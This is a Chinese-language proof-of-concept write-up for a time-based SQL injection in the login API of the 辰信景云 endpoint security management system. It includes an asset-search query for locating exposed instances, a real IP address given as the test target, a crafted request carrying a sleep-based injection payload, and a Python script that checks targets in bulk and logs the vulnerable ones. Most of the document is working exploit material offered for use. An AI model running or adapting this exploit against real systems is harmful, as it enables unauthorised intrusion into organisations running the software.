# 辰信景云终端安全管理系统 login存在 SQL注入漏洞

## 一、资产搜索

```
"辰信景云终端安全管理系统" && icon_hash="-429260979"
```

## 二、测试地址

```
https://106.55.100.76
```

## 三、验证

构造的请求包

```
POST /api/user/login HTTP/2
Host: 106.55.100.76
Content-Length: 181
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(10))a)='


username=123%40qq.com&password=e10adc3949ba59abbe56e057f20f883e&captcha=
```

![image-20240903133357412](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903133357412.png)

## 四、POC

![image-20240903141200070](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903141200070.png)

```
def poc(target):
    payload = "/api/user/login"
    data = """
    captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(10))a)='\r\n
    username=123%40qq.com&password=e10adc3949ba59abbe56e057f20f883e&captcha=
    """
    headers = {
        "Content-Length": "181",
        "Accept": "application/json,text/javascript,*/*;q=0.01",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
    }
    res1 = requests.get(url=target, verify=False)
    try:
        if res1.status_code == 200:
            res2 = requests.post(url=target, verify=False)
            res3 = requests.post(url=target + payload, headers=headers, data=data, verify=False)
            time2 = res2.elapsed.total_seconds()
            time3 = res3.elapsed.total_seconds()
            if time3 - time2 >= 9 and time3 > 10:
                with open("result.txt", "a",encoding="utf-8") as f:
                    f.write(f"该{target}存在延时注入漏洞{time3 - time2}\n")
                print(f"该{target}存在延时注入漏洞{time3 - time2}")
            elif time3 < 9:
                print(f"该{target}不存在延时注入漏洞{time3 - time2}")
        else:
            print(f"该{target}存在问题，请手动测试")
    except Exception as e:
        print(e)
```



## 五、测试结果

![image-20240903143307789](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903143307789.png)

![image-20240903143546230](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240903143546230.png)